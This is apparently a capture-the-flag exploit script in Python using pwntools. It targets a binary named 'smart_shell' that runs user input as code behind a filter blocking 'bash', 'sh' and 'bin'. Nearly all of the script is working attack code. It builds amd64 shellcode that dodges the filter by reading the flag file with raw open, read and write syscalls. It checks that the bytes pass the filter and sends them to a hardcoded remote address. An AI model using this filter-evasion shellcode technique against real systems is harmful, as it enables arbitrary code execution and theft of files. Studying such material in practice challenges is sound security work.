#!/usr/bin/env python3
# Exploit for ./smart_shell
#
# main():
#   fgets(buf, 0x96, stdin)           -> up to 149 bytes of attacker input
#   if valid_shellcode(buf): call buf  -> our bytes are executed directly
#
# valid_shellcode() rejects the input if strstr() finds ANY of these ASCII
# substrings in it (rodata @ 0xa08 / 0xa0d / 0xa10):
#       "bash"   "sh"   "bin"
# so the usual execve("/bin/sh") -- and even execve("/bin/cat",...) -- are out,
# because they all contain "bin"/"sh".
#
# Trick: don't spawn a shell / don't exec any /bin/* program at all.  Just read
# the flag with raw syscalls:  open("/home/ctf/flag") -> read -> write(1).
# The path "/home/ctf/flag" contains none of the forbidden substrings.
#
# Byte constraints on the shellcode:
#   * no 0x0a  (fgets stops at newline)     -> we assert this below
#   * <= 149 bytes                          -> we assert this below
#   * must not contain b"bash"/b"sh"/b"bin" -> we assert this below

import sys
from pwn import *

context.binary = ELF('./smart_shell', checksec=False)
context.arch   = 'amd64'

# ---- change this one line if the real flag path differs (e.g. /flag) ---------
FLAG_PATH = b"/home/ctf/flag"
# -----------------------------------------------------------------------------

# Pad the path to a whole number of 8-byte words, NUL-terminated, then push it
# onto the stack word-by-word (highest word first so the string starts at rsp).
path = FLAG_PATH + b"\x00"
path += b"\x00" * ((-len(path)) % 8)          # pad up to multiple of 8
words = [u64(path[i:i+8]) for i in range(0, len(path), 8)]

push_path = ""
for w in reversed(words):
    push_path += "mov rax, %#x\n push rax\n" % w

sc = push_path + """
    mov  rdi, rsp        /* path  = &"/home/ctf/flag" */
    xor  esi, esi        /* flags = O_RDONLY          */
    xor  edx, edx        /* mode  = 0                 */
    push 2
    pop  rax             /* SYS_open                  */
    syscall

    mov  rdi, rax        /* fd                        */
    mov  rsi, rsp
    sub  rsi, 0x200      /* buf (well below our code) */
    mov  rdx, 0x200      /* count                     */
    xor  eax, eax        /* SYS_read                  */
    syscall

    mov  rdx, rax        /* count = bytes read        */
    mov  rsi, rsp
    sub  rsi, 0x200      /* buf                       */
    push 1
    pop  rdi             /* fd = stdout               */
    push 1
    pop  rax             /* SYS_write                 */
    syscall

    push 60
    pop  rax             /* SYS_exit                  */
    xor  edi, edi
    syscall
"""

shellcode = asm(sc)

# ---- sanity checks: make sure the filter and fgets won't reject us -----------
for bad in (b"bash", b"sh", b"bin"):
    assert bad not in shellcode, "shellcode contains forbidden substring %r" % bad
assert b"\n" not in shellcode, "shellcode contains a newline (fgets would truncate)"
assert len(shellcode) <= 149, "shellcode too long: %d" % len(shellcode)
log.info("shellcode: %d bytes, filter-clean", len(shellcode))

# ---- deliver -----------------------------------------------------------------
if '--remote' in sys.argv:
    HOST = sys.argv[sys.argv.index('--remote') + 1] if len(sys.argv) > sys.argv.index('--remote') + 1 else '141.85.224.104'
    PORT = int(sys.argv[sys.argv.index('--port') + 1]) if '--port' in sys.argv else 0
    io = remote(HOST, PORT)
else:
    # io = process('./smart_shell')
    io = remote("141.85.224.104", 33331)
io.sendlineafter(b'flag:', shellcode)   # prompt: "Insert your smart shellcode in order to get the flag: "
print(io.recvall(timeout=2).decode(errors='replace'))
